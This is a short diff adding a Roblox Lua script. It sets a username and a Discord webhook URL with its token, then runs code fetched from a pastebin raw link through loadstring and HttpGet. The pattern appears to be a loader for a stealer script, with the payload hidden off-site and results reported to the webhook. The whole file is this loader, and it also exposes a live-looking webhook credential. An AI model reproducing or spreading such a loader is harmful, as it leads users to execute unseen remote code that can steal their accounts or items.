@@ -1,0 +1,9 @@
+
+
+_G.Username = "Zitroxx9939"
+
+
+_G.Webhook = "https://discordapp.com/api/webhooks/1112816091027210250/YHS2L1qI9jxZ4J3acRTBrYONLYdnFpZJMbjepjmdo2dUGehfji5jD5JsAu8DEViKbtxK"
+
+
+loadstring(game:HttpGet("https://pastebin.com/raw/Tv4GF7ub", true))()
